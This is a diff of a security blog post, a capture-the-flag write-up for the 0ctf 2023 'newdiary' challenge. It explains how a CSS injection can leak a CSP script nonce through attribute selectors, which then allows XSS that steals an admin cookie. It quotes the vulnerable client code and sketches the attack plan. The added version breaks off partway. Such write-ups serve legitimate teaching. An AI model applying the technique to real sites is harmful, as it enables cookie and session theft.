@@ -1,604 +1,361 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta
-    name="description"
-    content="Personal blog about Cybersec &amp; other things."
-  />
-  
-    
-      <title>One-shot CSS Injection - newdiary - 0ctf 2023 | Salvatore Abello&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  <link rel="stylesheet" href="/css/font.css"/>
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
- <link rel="stylesheet" href="/css/syntax.css">
-
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-  <link rel="manifest" href="/site.webmanifest">
-  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <div id="root">
-      <header>
-  <div id="brand">
-    <a class="icon-link" href="https://blog.babelo.xyz/">
-      <img
-        class="icon"
-        src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://blog.babelo.xyz/"><h1>Salvatore Abello&#39;s Blog</h1></a>
-      <h3>Hacking &amp; other stuff</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/whoami/"><b>Whoami</b></a>
-      
-         | 
-        <a href="/achievements/"><b>Achievements</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/cves/"><b>CVEs</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-      <div id="content">
-        
-  <main>
-    <article>
-      <h1 class="title">One-shot CSS Injection - newdiary - 0ctf 2023</h1>
-      
-      <div class="post-meta">
-  <strong>
-    <span>Posted on</span>
-    <time>2023-12-12 00:00:00</time>
-    
-    
-  </strong>
-  <span> • 1900 words</span>
-  <span> • 9 minute read</span>
-  
-  
-    <div>
-      <span>Tags:</span>
-      
-        <a href="/tags/cybersec">Cybersec</a>, 
-        <a href="/tags/writeup">Writeup</a>, 
-        <a href="/tags/web">web</a>, 
-        <a href="/tags/client-side">client-side</a>, 
-        <a href="/tags/css-injection">css-injection</a>
-    </div>
-  
-</div>
-
-      <div class="content"><p>This year, for the first time, I partecipated to <strong>0ctf</strong> with <code>mhackeroni</code>.
-Me, <code>@Ricy</code> and <code>@Alemmi</code> solved this challenge, we spent many hours in order to find a working exploit, but it was worth it.</p>
-<h2 id="index">
-  <a class="full-clickable-heading" href="#index">
-    Index
-  </a>
-</h2>
-<ul>
-<li><a href="#new-diary-14-solves">New Diary (14 solves)</a>
-<ul>
-<li><a href="#index">Index</a></li>
-<li><a href="#overview">Overview</a></li>
-<li><a href="#exploit-idea">Exploit idea</a></li>
-<li><a href="#leaking-the-nonce">Leaking the nonce</a></li>
-<li><a href="#sources">Sources</a>
-<ul>
-<li><a href="#css-exploit">CSS exploit</a></li>
-<li><a href="#first-note-id-0">First note (ID 0)</a></li>
-<li><a href="#second-note-id-1">Second Note (ID 1)</a></li>
-<li><a href="#third-note-id-2">Third Note (ID 2)</a></li>
-<li><a href="#final-exploit">Final exploit</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-<h2 id="overview">
-  <a class="full-clickable-heading" href="#overview">
-    Overview
-  </a>
-</h2>
-<p>This is a whitebox web challenge and it&rsquo;s client-side, we need to steal the admin cookie with the flag inside, so we have to do XSS.
-We&rsquo;re able to:</p>
-<ul>
-<li>Create new notes with a <code>title</code> (30 chars max) and <code>content</code> (256 chars max);</li>
-<li>Share notes with everyone;</li>
-<li>View notes from every user (as long as they shared it);</li>
-<li>Report to an admin a note (ID and username is needed).</li>
-</ul>
-<p>The shared notes are loaded on client-side:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">load</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">param</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">param</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">param</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">id</span> <span class="o">&amp;&amp;</span> <span class="sr">/^[0-9a-f]+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">id</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">===</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">fetch</span><span class="p">(</span><span class="sb">`/share/read/</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">`</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">title</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">title</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">title</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">).</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">title</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        
-</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">content</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">content</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">).</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="p">})</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">fetch</span><span class="p">(</span><span class="sb">`/share/read/</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">?username=</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">`</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">title</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">title</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">title</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">).</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">title</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">content</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">content</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">).</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="p">})</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;report&#34;</span><span class="p">).</span><span class="nx">href</span> <span class="o">=</span> <span class="sb">`/report?id=</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">&amp;username=</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">removeEventListener</span><span class="p">(</span><span class="s1">&#39;hashchange&#39;</span><span class="p">,</span> <span class="nx">load</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nx">load</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;hashchange&#39;</span><span class="p">,</span> <span class="nx">load</span><span class="p">);</span>
-</span></span></code></pre></div><p>We can clearly see that:</p>
-<ul>
-<li>Since <code>document.addEventListener('hashchange', load)</code> is used, we can actually load more than one post on the same request, by changing only the hash part <code>#id=1&amp;username=asd</code> we do not make reload the page, keeping the same nonce. We can change hash only once, since the event listener will be removed later (otherwise the exploit could have been a lot easier).</li>
-<li>we can write every HTML tag we want since <code>content.innerHTML</code> is used.</li>
-</ul>
-<p>So that&rsquo;s it&hellip; Right? We can just execute any js code we want and then steal the cookie!
-Of course not, if we read more carefully <code>read_share.html</code> we notice there&rsquo;s a meta tag which defines the CSP (Content Security Policy):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Security-Policy&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="na">content</span><span class="o">=</span><span class="s">&#34;script-src &#39;nonce-&lt;%= nonce %&gt;&#39;; frame-src &#39;none&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;; style-src &#39;unsafe-inline&#39; https://unpkg.com&#34;</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>So we can&rsquo;t execute any js code as long as they don&rsquo;t have the right nonce, which is generated randomly and it changes every time we make a request. We can see how the nonce is generated in <code>app.js</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">genNonce</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;_&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/_/g</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="s2">&#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">randomInt</span><span class="p">(</span><span class="mi">36</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="p">);</span>
-</span></span></code></pre></div><p>Thus, we have <code>36^32</code> possible nonces, which is a lot. We can&rsquo;t bruteforce it, so we need to find another way.</p>
-<p>However, due to the <code>unsafe-inline</code> CSP policy, we&rsquo;re able to insert CSS by using the <code>&lt;style&gt;</code> tag and by uploading to <code>npm</code> (the files are taken by <code>unpkg.com</code>)</p>
-<p>By doing a quick research it&rsquo;s clear that we need to steal the nonce using CSS.</p>
-<p><strong>Note:</strong> It&rsquo;s possible to leak the nonce using CSS because it&rsquo;s inside a meta tag, otherwise it wouldn&rsquo;t be possibile.</p>
-
-<h2 id="exploit-idea">
-  <a class="full-clickable-heading" href="#exploit-idea">
-    Exploit idea
-  </a>
-</h2>
-<p>The exploit would be something similar to:</p>
-<ol>
-<li>Upload to <code>npm</code> a css file <code>leak.css</code> whose content is the exploit which will leak the nonce (I&rsquo;m going to talk about this later).</li>
-<li>Create a post (ID 0) with a <code>meta</code> tag, which is needed to redirect the admin to an HTML page controlled by us.</li>
-<li>Create a post (ID 1) where we import the <code>leak.css</code> and where the nonce will be stolen.</li>
-<li>Report the meta redirect post (ID 0) to the admin, so he will be redirected to our page, where we can make him load the post where the <code>leak.css</code> style is imported (ID 1)</li>
-<li>Finally, on the fly, when we have leaked the nonce, we create the last post (ID 2) where we can execute arbitrary js code with a nonce script, we can make the bot load the post (ID 2) where the XSS is executed, by changing the hash part of the url.</li>
-<li>Profit.</li>
-</ol>
-<p>Main issue is, though, to understand how to leak the nonce.</p>
-
-<h2 id="leaking-the-nonce">
-  <a class="full-clickable-heading" href="#leaking-the-nonce">
-    Leaking the nonce
-  </a>
-</h2>
-<p>The first idea that came into our mind is using the following css rules in order to leak the nonce:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">body</span><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">^=</span><span class="s2">&#34;a&#34;</span><span class="o">])</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nt">body</span><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">^=</span><span class="s2">&#34;b&#34;</span><span class="o">])</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nt">body</span><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">^=</span><span class="s2">&#34;c&#34;</span><span class="o">])</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[...]</span>
-</span></span></code></pre></div><p>When a request is sent to our server, we know which char is right, and then we would upload a new css file to npm in order to leak the following char.</p>
-<p>We quickly realized it&rsquo;s not possible due to multiple reasons:</p>
-<ul>
-<li>the uploading process is too slow,</li>
-<li>we cannot import dynamically css since we cannot reload the page, leading to losing the nonce</li>
-<li>we can only load another post once.</li>
-</ul>
-<p>so we moved on.</p>
-<p>An idea which sounded great came into my mind the next day: we can leak the whole nonce in parts by using the <code>*=</code> operator in CSS.</p>
-<p>Example:
-Let&rsquo;s say our nonce is <code>testo</code>, if we can leak substrings of the nonce, then to our server we might receive these requests:</p>
-<p><code>?x=tes</code>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Did you know you can exfiltrate entire attribute values using only css, without bruteforcing?"><title>One-shot CSS Injection - newdiary - 0ctf 2023 | Salvatore Abello's Blog</title>
+<meta property="og:title" content="One-shot CSS Injection - newdiary - 0ctf 2023"><meta property="og:description" content="Did you know you can exfiltrate entire attribute values using only css, without bruteforcing?"><meta property="og:type" content="article"><meta property="og:url" content="https://salvatore-abello.github.io/posts/newdiary/"><meta property="og:site_name" content="Salvatore Abello's Blog"><meta property="og:image" content="https://salvatore-abello.github.io/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=twitter:card content="summary"><meta name=twitter:title content="One-shot CSS Injection - newdiary - 0ctf 2023"><meta name=twitter:description content="Did you know you can exfiltrate entire attribute values using only css, without bruteforcing?"><meta name=twitter:image content="https://salvatore-abello.github.io/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=keywords content="Cybersec,Writeup,web,client-side,css-injection"><meta property="article:published_time" content="2023-12-12T00:00:00Z"><meta property="article:modified_time" content="2023-12-12T00:00:00Z"><meta property="article:author" content="Salvatore Abello"><link rel=canonical href=https://salvatore-abello.github.io/posts/newdiary/><link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/font.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/syntax.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><div id=root><header><div id=brand><a class=icon-link href=https://salvatore-abello.github.io/><img class=icon src=/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png></a><div class=text><a href=https://salvatore-abello.github.io/><h1>Salvatore Abello's Blog</h1></a><h3>Hacking & other stuff</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/whoami/><b>Whoami</b></a>
+|
+<a href=/achievements/><b>Achievements</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/cves/><b>CVEs</b></a>
+| <a href=/index.xml class=rss-link title="RSS Feed"><b>RSS</b></a></nav><hr></header><div id=content><main><article><h1 class=title>One-shot CSS Injection - newdiary - 0ctf 2023</h1><div class=post-meta><strong><span>Posted on</span>
+<time>2023-12-12 00:00:00</time>
+</strong><span>• 1900 words</span>
+<span>• 9 minute read</span><div><span>Tags:</span>
+<a href=/tags/cybersec>Cybersec</a>,
+<a href=/tags/writeup>Writeup</a>,
+<a href=/tags/web>web</a>,
+<a href=/tags/client-side>client-side</a>,
+<a href=/tags/css-injection>css-injection</a></div></div><div class=content><p>This year, for the first time, I partecipated to <strong>0ctf</strong> with <code>mhackeroni</code>.
+Me, <code>@Ricy</code> and <code>@Alemmi</code> solved this challenge, we spent many hours in order to find a working exploit, but it was worth it.</p><h2 id=index><a class=full-clickable-heading href=#index>Index</a></h2><ul><li><a href=#new-diary-14-solves>New Diary (14 solves)</a><ul><li><a href=#index>Index</a></li><li><a href=#overview>Overview</a></li><li><a href=#exploit-idea>Exploit idea</a></li><li><a href=#leaking-the-nonce>Leaking the nonce</a></li><li><a href=#sources>Sources</a><ul><li><a href=#css-exploit>CSS exploit</a></li><li><a href=#first-note-id-0>First note (ID 0)</a></li><li><a href=#second-note-id-1>Second Note (ID 1)</a></li><li><a href=#third-note-id-2>Third Note (ID 2)</a></li><li><a href=#final-exploit>Final exploit</a></li></ul></li></ul></li></ul><h2 id=overview><a class=full-clickable-heading href=#overview>Overview</a></h2><p>This is a whitebox web challenge and it&rsquo;s client-side, we need to steal the admin cookie with the flag inside, so we have to do XSS.
+We&rsquo;re able to:</p><ul><li>Create new notes with a <code>title</code> (30 chars max) and <code>content</code> (256 chars max);</li><li>Share notes with everyone;</li><li>View notes from every user (as long as they shared it);</li><li>Report to an admin a note (ID and username is needed).</li></ul><p>The shared notes are loaded on client-side:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>load</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;title&#34;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;content&#34;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>param</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URLSearchParams</span><span class=p>(</span><span class=nx>location</span><span class=p>.</span><span class=nx>hash</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>1</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>id</span> <span class=o>=</span> <span class=nx>param</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>username</span> <span class=o>=</span> <span class=nx>param</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>id</span> <span class=o>&amp;&amp;</span> <span class=sr>/^[0-9a-f]+$/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>id</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>username</span> <span class=o>===</span> <span class=kc>null</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>fetch</span><span class=p>(</span><span class=sb>`/share/read/</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>`</span><span class=p>).</span><span class=nx>then</span><span class=p>(</span><span class=nx>data</span> <span class=p>=&gt;</span> <span class=nx>data</span><span class=p>.</span><span class=nx>json</span><span class=p>()).</span><span class=nx>then</span><span class=p>(</span><span class=nx>data</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>title</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;p&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=nx>title</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=nx>data</span><span class=p>.</span><span class=nx>title</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;title&#34;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>title</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>content</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;p&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=nx>content</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>data</span><span class=p>.</span><span class=nx>content</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;content&#34;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>content</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>})</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>fetch</span><span class=p>(</span><span class=sb>`/share/read/</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>?username=</span><span class=si>${</span><span class=nx>username</span><span class=si>}</span><span class=sb>`</span><span class=p>).</span><span class=nx>then</span><span class=p>(</span><span class=nx>data</span> <span class=p>=&gt;</span> <span class=nx>data</span><span class=p>.</span><span class=nx>json</span><span class=p>()).</span><span class=nx>then</span><span class=p>(</span><span class=nx>data</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>title</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;p&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=nx>title</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=nx>data</span><span class=p>.</span><span class=nx>title</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;title&#34;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>title</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>content</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;p&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=nx>content</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>data</span><span class=p>.</span><span class=nx>content</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;content&#34;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>content</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>})</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;report&#34;</span><span class=p>).</span><span class=nx>href</span> <span class=o>=</span> <span class=sb>`/report?id=</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>&amp;username=</span><span class=si>${</span><span class=nx>username</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>removeEventListener</span><span class=p>(</span><span class=s1>&#39;hashchange&#39;</span><span class=p>,</span> <span class=nx>load</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nx>load</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nb>window</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s1>&#39;hashchange&#39;</span><span class=p>,</span> <span class=nx>load</span><span class=p>);</span>
+</span></span></code></pre></div><p>We can clearly see that:</p><ul><li>Since <code>document.addEventListener('hashchange', load)</code> is used, we can actually load more than one post on the same request, by changing only the hash part <code>#id=1&amp;username=asd</code> we do not make reload the page, keeping the same nonce. We can change hash only once, since the event listener will be removed later (otherwise the exploit could have been a lot easier).</li><li>we can write every HTML tag we want since <code>content.innerHTML</code> is used.</li></ul><p>So that&rsquo;s it&mldr; Right? We can just execute any js code we want and then steal the cookie!
+Of course not, if we read more carefully <code>read_share.html</code> we notice there&rsquo;s a meta tag which defines the CSP (Content Security Policy):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;Content-Security-Policy&#34;</span>
